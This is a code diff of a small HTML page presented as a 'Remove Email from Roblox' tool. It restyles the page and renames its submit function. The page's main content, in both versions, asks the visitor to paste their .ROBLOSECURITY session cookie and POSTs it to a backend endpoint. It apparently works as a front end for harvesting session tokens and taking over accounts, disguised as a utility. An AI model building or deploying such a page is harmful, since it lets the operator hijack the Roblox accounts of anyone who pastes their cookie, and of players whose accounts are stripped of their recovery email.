@@ -1,24 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Roblox Email Remover</title>
+  <meta charset="UTF-8">
+  <title>Remove Email from Roblox</title>
   <style>
     body {
-      background-color: #f1f5f9;
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding-top: 60px;
-    }
-    h2 {
-      color: #333;
+      font-family: sans-serif;
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      background: #f9f9f9;
     }
     input, button {
-      width: 300px;
+      width: 100%;
+      margin-top: 12px;
       padding: 10px;
-      margin-top: 10px;
-      font-size: 1rem;
+      font-size: 14px;
     }
     .result {
       margin-top: 20px;
@@ -28,28 +27,25 @@
 </head>
 <body>
   <h2>Remove Email from Roblox</h2>
-  <input id="cookie" placeholder=".ROBLOSECURITY Cookie" />
-  <button onclick="submit()">Remove Email</button>
+  <input type="text" id="cookie" placeholder=".ROBLOSECURITY Cookie" />
+  <button onclick="removeEmail()">Remove Email</button>
   <div class="result" id="result"></div>
 
   <script>
-    async function submit() {
+    async function removeEmail() {
       const cookie = document.getElementById('cookie').value;
-      const result = document.getElementById('result');
-      result.innerText = 'Processing...';
+      const resultDiv = document.getElementById('result');
 
-      try {
-        const res = await fetch('/api/remove-email', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cookie })
-        });
+      const res = await fetch('/api/remove-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ cookie })
+      });
 
-        const data = await res.json();
-        result.innerText = data.status === 'success' ? '✅ ' + data.message : '❌ ' + data.message;
-      } catch {
-        result.innerText = '❌ Request failed.';
-      }
+      const data = await res.json();
+      resultDiv.innerText = data.success ? '✅ Email removed' : '❌ Failed: ' + (data.message || 'Unknown error');
     }
   </script>
 </body>
